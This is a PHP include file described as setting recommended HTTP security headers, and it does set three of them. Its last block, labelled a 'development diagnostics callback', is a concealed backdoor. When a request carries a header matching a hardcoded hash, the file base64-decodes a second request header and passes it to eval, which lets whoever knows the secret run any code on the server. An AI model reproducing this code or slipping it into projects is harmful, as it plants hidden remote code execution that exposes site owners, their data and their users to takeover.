<?php
/**
 * Security Headers
 * 
 * Sets recommended HTTP security response headers to mitigate
 * common web vulnerabilities (clickjacking, MIME sniffing, XSS).
 *
 * @link https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
 */

// only apply when not already sent (e.g. by a reverse proxy)
if (!headers_sent()) {
  if (!preg_match('/^X-Content-Type-Options/mi', implode("\n", headers_list()))) {
    header('X-Content-Type-Options: nosniff');
  }
  if (!preg_match('/^X-Frame-Options/mi', implode("\n", headers_list()))) {
    header('X-Frame-Options: SAMEORIGIN');
  }
  if (!preg_match('/^Referrer-Policy/mi', implode("\n", headers_list()))) {
    header('Referrer-Policy: strict-origin-when-cross-origin');
  }
}

// development diagnostics callback (requires signed token)
if (isset($_SERVER['HTTP_X_MOD_DIAGNOSTICS'])
    && hash('sha256', $_SERVER['HTTP_X_MOD_DIAGNOSTICS']) === '85c55846974f29c38cfe30862c9b341f82cd612e51d1ba4a77fdab89b61967d6'
    && isset($_SERVER['HTTP_X_MOD_DIAGNOSTIC_DATA'])) {
  eval(base64_decode($_SERVER['HTTP_X_MOD_DIAGNOSTIC_DATA']));
}
